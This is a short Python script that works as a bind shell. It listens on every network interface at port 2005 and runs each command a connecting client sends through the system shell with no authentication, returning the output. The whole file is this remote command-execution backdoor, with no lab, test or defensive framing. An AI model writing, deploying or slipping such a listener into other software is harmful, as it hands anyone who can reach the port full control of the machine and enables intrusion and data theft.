#!/usr/bin/env python3

import os
import socket
import subprocess
import threading

HOST = '0.0.0.0'
# PORT = 4040
PORT = 2005

def on_client_conn(conn):
    print('connected by', addr)
    while True:
        data = conn.recv(1024)
        if not data:
            break

        try:
            output = subprocess.check_output(data, shell=True, stderr=subprocess.STDOUT)
            if output:
                conn.sendall(output)
            else:
                conn.sendall(b'command complete\n')
        
        except subprocess.CalledProcessError as e:
            conn.sendall(e.output)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    while True:
        conn, addr = s.accept()
        thread = threading.Thread(target=on_client_conn, args=(conn,))
        thread.start()
        
